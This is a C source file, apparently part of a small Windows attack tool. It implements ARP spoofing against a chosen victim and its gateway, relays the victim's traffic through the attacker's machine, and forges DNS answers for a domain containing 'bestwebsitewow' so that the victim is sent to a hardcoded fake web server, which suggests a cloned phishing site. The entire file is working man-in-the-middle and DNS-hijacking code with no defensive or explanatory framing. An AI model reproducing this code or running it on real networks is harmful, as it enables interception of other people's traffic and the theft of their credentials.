#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "infect.h"

#include <malloc.h>

#include "commands.h"
#include "network_headers.h"
#include "utils.h"

static BOOL finished_infecting;
send_params infect_params;
u_long fake_web = 220506075; // TODO 

/* ethernet layer macros */
#define SET_SRC_MAC(eth, mac) memcpy(eth->src_addr, mac, ETH_ALEN)
#define SET_DST_MAC(eth, mac) memcpy(eth->dest_addr, mac, ETH_ALEN)
#define COMPARE_MACS(mac1, mac2) memcmp(mac1, mac2,ETH_ALEN) == 0

/* xor xor xor between ips */
#define SWITCH_IPS(network_layer) network_layer->src_addr ^= network_layer->dest_addr;\
network_layer->dest_addr ^= network_layer->src_addr;\
network_layer->src_addr ^= network_layer->dest_addr

/* xor xor xor between ports */
#define SWITCH_PORTS(transport_layer) transport_layer->src_port ^= transport_layer->dst_port;\
transport_layer->dst_port ^= transport_layer->src_port;\
transport_layer->src_port ^= transport_layer->dst_port

/*
* @purpose: keep sending fake arp packets to maintain MITM.
* @params: thread syntax.
* @return 0.
* 
*/
static DWORD WINAPI start_arp_spoofing(
	LPVOID lparam
)
{
	uint32_t host_ip = *(uint32_t*)lparam;
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
	
	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char rearping_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		infect_params.gateway_ip,
		infect_params.victim_ip,
		infect_params.adapter->Address,
		infect_params.victim_mac,
		2
	);
	
	build_packet(
		gateway_packet,
		infect_params.victim_ip,
		infect_params.gateway_ip,
		infect_params.adapter->Address,
		infect_params.gateway_mac,
		2
	);

	build_packet(
		rearping_packet,
		infect_params.gateway_ip,
		host_ip,
		infect_params.gateway_mac,
		infect_params.adapter->Address,
		2
	);
	
	while (!finished_infecting)
	{
		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
		pcap_sendpacket(infect_params.fp, rearping_packet, pack_size);
		Sleep(4000);
	}

	finished_infecting = 0;

	return 0;
}

/*
* @purpose: adding the correct arp entries to the victim and gateway machines.
* @params: None.
* @return: void.
*/
static void stop_arp_spoofing()
{
	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);

	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];

	/* build the packets */
	build_packet(
		victim_packet,
		infect_params.gateway_ip,
		infect_params.victim_ip,
		infect_params.gateway_mac,
		infect_params.victim_mac,
		2
	);

	build_packet(
		gateway_packet,
		infect_params.victim_ip,
		infect_params.gateway_ip,
		infect_params.victim_mac,
		infect_params.gateway_mac,
		2
	);

	pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
	pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);

	finished_infecting = 1;
}

/*
* @purpose: change the sizes of the network/transport layers in order to match
* the fake DNS respones.
* @params:  packet - the packet to be changed.
*			end_packet - point to the end of the packet
* @return:	void.
* 
*/
static void change_packet_sizes(
	void* const packet, 
	void* const end_packet
)
{
	/* locals */
	ip_hdr* ip_header;
	udp_hdr* udp_header;

	ip_header = (ip_hdr*)((BYTE*)packet + sizeof(ether_hdr));
	udp_header = (udp_hdr*)((BYTE*)packet + sizeof(ether_hdr) + sizeof(ip_hdr));
	
	ip_header->length = htons((BYTE*)end_packet - (BYTE*)ip_header);
	ip_header->chksum = 0;
	ip_header->chksum = in_checksum((uint16_t*)ip_header, sizeof(ip_hdr));

	udp_header->len = htons((BYTE*)end_packet - (BYTE*)udp_header);
	udp_header->chksum = 0;
	udp_header->chksum = htons(net_checksum_tcpudp(htons(udp_header->len), 17, (uint8_t*)&ip_header->src_addr, (uint8_t*)udp_header));
}

/*
* @purpose: changes the answer section of the DNS packet.
* @params:	pDnsSection - pointer to the start of the DNS section (base).
*			pAnswerSection - pointer to the answer section.
*			pQuestion - pointer to the question string (response packet).
* @return:	the pointer to the end of the packet.
* 
*/
static void* create_fake_dns_respones(
	void* const pDnsSection, 
	void* const pAnswerSection, 
	void* const pQuestion
)
{
	/* locals */
	dns_hdr* dns_header = (dns_hdr*)pDnsSection;
	dns_answer answer = *(dns_answer*)pAnswerSection;

	/* make dns constant header match the fake packet */
	dns_header->flags = htons(0x8400);
	dns_header->answers = htons(1); // one answer (fake)
	dns_header->authority = 0;
	dns_header->additional = 0;
	
	/* build the fake answer */
	answer.name = htons((BYTE*)pQuestion - (BYTE*)pDnsSection);
	answer.name |= 0xc0; //(b: 1100-0000) 
	answer.cls = htons(1); // IN
	answer.ttl = htonl(60); // minute.
	answer.type = htons(1); // addr
	answer.len = htons(4); //ipv4 addr in bytes
	answer.addr = htonl(fake_web);

	*((dns_answer*)pAnswerSection) = answer;
	return (BYTE*)pAnswerSection + sizeof(dns_answer);
}

/*
* @purpose: Checks if a DNS packet is intended for the specific cloned website.
* If so changes the packet for DNS hijacking.
* @params: packet - the network packet
* @return: true - if packet has changed, else false. 
* 
* (change packet_size param if packet changes)
* 
*/
static int dns_spoofing(
	u_char* const packet, 
	size_t* packet_size
)
{
	/* check if valid DNS packet */
	ether_hdr* eth_header = (ether_hdr*)packet;
	ip_hdr* ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
	udp_hdr* udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));

	if (eth_header->frame_type != htons(NETWORK_IPv4) // ipv4
		|| ip_header->protocol != TRANSPORT_UDP // udp protocol
		|| udp_header->dst_port != htons(53)) // dns port
		return 0; // false

	/* locals */
	void* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
	void* dns_question = (void*)((u_char*)dns_header + sizeof(dns_hdr));
	void* dns_answer = (void*)((u_char*)dns_question + strlen(dns_question) + 5);
	void* end_packet;
	
	if (!strstr(dns_question, "bestwebsitewow"))
		return 0;

	/* create fake dns packet */
	end_packet = create_fake_dns_respones(dns_header, dns_answer, dns_question);

	/* change udp/ip header length fields */
	change_packet_sizes(packet, end_packet);

	/* update status */
	*packet_size = (BYTE*)end_packet - (BYTE*)packet;

	return 1; // true if changed
}

void infect()
{
	/* locals */
	PIP_ADAPTER_INFO pAdapterInfo = NULL;
	ULONG outBufLen = 0;
	uint32_t host, netmask;

	/* pcap adapters */
	pcap_t* fp;
	pcap_if_t* alldevs = NULL, * adapter;
	
	/* filtering */
	char filter[100] = {0};
	struct in_addr n_addr;
	struct bpf_program fcode;

	/* MITM */
	int res;
	struct pcap_pkthdr* pkt_header;
	u_char* pkt_data = NULL;
	size_t packet_size;


	/* allocate heap memory */
	GetAdaptersInfo(pAdapterInfo, &outBufLen);
	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);

	pcap_findalldevs(&alldevs, NULL);

	/* check if allocation worked successfully */
	if (!pAdapterInfo || !alldevs)
		return;

	/* get system adapters */
	GetAdaptersInfo(pAdapterInfo, &outBufLen);

	/* find the corresponding adapter to the victim */
	v_adapter(alldevs, &adapter, infect_params.victim_ip, &host, &netmask);
	if (adapter == NULL)
		return;

	/* open the adapter */
	fp = pcap_open(
		adapter->name,
		65536,
		PCAP_OPENFLAG_PROMISCUOUS,
		20,
		NULL,
		NULL
	);

	/* pass global commands to start_arp_spoofing thread */
	infect_params.fp = fp;
	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
	
	/* create filter */
	n_addr.S_un.S_addr = infect_params.victim_ip;
	snprintf(filter, 100, "%s %s %s %02X%02X%02X%02X%02X%02X\n", 
		"ip host",
		inet_ntoa(n_addr),
		"and not ether src",
		infect_params.adapter->Address[0],
		infect_params.adapter->Address[1],
		infect_params.adapter->Address[2],
		infect_params.adapter->Address[3],
		infect_params.adapter->Address[4],
		infect_params.adapter->Address[5]
	);

	/* compile the filter */
	if (pcap_compile(fp, &fcode, filter, 1, netmask) < 0)
	{
		free(pAdapterInfo);
		pcap_freealldevs(alldevs);
		pcap_close(fp);
		return;
	}

	/* implement the filter to the adapter */
	if (pcap_setfilter(fp, &fcode) < 0)
	{
		free(pAdapterInfo);
		pcap_freealldevs(alldevs);
		pcap_close(fp);
		return;
	}

	/* start start_arp_spoofing thread */
	HANDLE hThread;
	hThread = CreateThread(NULL, 0, start_arp_spoofing, (LPVOID)&host, 0, NULL);
	if (!hThread)
	{
		free(pAdapterInfo);
		pcap_freealldevs(alldevs);
		pcap_close(fp);
		return;
	}	

	/* MITM loop */
	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
	{
		/* Timeout elapsed */
		if (res == 0)
		{
			if (WaitForSingleObject(hThread, 0) == WAIT_OBJECT_0)
			{
				CloseHandle(hThread);
				break;
			}
			continue;
		}

		/* pointers to the intercepted packets */
		ether_hdr* eth_header = (ether_hdr*)pkt_data;
		ip_hdr* ip_header = (ip_hdr*)(pkt_data + sizeof(ether_hdr));
		udp_hdr* udp_header = (udp_hdr*)(pkt_data + sizeof(ether_hdr) + sizeof(ip_hdr));

		packet_size = pkt_header->caplen;

		/* change packet src/dst (MITM) */
		if (COMPARE_MACS(eth_header->src_addr, infect_params.victim_mac)) // if src = taget
		{	
			/* check for DNS packets */
			if (dns_spoofing(pkt_data, &packet_size))
			{
				/* switch dst/src eth/net/transport layers */
				SET_DST_MAC(eth_header, infect_params.victim_mac);
				SWITCH_IPS(ip_header);
				SWITCH_PORTS(udp_header);
			}
			else
			{
				/* forward normally */
				SET_DST_MAC(eth_header, infect_params.gateway_mac); 
				
				/* check if redirect worked */
				if (ip_header->dest_addr == fake_web)
					stop_arp_spoofing();
			}
		}
		else
			SET_DST_MAC(eth_header, infect_params.victim_mac); // else (dst = victim)
		SET_SRC_MAC(eth_header, infect_params.adapter->Address); // src = this

		/* forward packet */
		pcap_sendpacket(fp, pkt_data, packet_size);
	}
}
